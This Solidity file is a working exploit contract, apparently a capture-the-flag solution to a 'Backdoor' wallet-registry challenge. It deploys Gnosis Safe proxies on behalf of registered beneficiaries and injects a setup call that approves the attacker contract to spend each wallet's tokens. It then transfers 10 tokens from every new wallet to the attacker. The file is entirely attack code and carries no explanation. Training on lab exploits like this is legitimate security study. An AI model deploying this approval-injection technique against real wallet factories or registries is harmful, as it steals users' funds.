// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../backdoor/WalletRegistry.sol";

contract BackdoorAttack {

    GnosisSafeProxyFactory gnosisSafeProxyFactory;
    WalletRegistry walletRegistry;
    IERC20 token;

    address singleton;
    address tokenAddress;
    address walletRegistryAddress;
    address owner;

    constructor(
        address _gnosisSafeProxyFactoryAddress,
        address _singletonAddress, 
        address _walletRegistryAddress, 
        address _tokenAddress
    ) {
        owner = msg.sender;
        gnosisSafeProxyFactory = GnosisSafeProxyFactory(_gnosisSafeProxyFactoryAddress);
        walletRegistry = WalletRegistry(_walletRegistryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        tokenAddress = _tokenAddress;
        token = IERC20(_tokenAddress);
        singleton = _singletonAddress;
    }

    function sneakApproval(address _spender, address _token) external {
        IERC20(_token).approve(_spender, 10 ether);
    }

    function triggerAttack(address[] memory _beneficiaries) external {
        require(msg.sender == owner, "Only attacker can trigger");

        for(uint i = 0; i < _beneficiaries.length; i++) {

            address[] memory owners = new address[](1);
            owners[0] = _beneficiaries[i];

            bytes memory _initialiser = abi.encodeWithSelector(
                GnosisSafe.setup.selector, // function selector
                owners,        // address[] calldata _owners,
                1,             // uint256 _threshold,
                address(this), // address to,

                // bytes calldata data [my attack payload to get token approval]
                abi.encodeWithSelector(
                    BackdoorAttack.sneakApproval.selector,
                    address(this),
                    tokenAddress
                ),   

                address(0), // address fallbackHandler,
                address(0), // address paymentToken,
                0,          // uint256 payment,
                address(0)  // address payable paymentReceiver
            );

            GnosisSafeProxy _proxy = gnosisSafeProxyFactory.createProxyWithCallback(
                singleton,                             // address singleton
                _initialiser,                          // bytes memory initializer
                i,                                     // uint256 saltNonce
                IProxyCreationCallback(walletRegistryAddress) // IProxyCreationCallback callback
            );

            token.transferFrom(address(_proxy), msg.sender, 10 ether);

        }

    }

}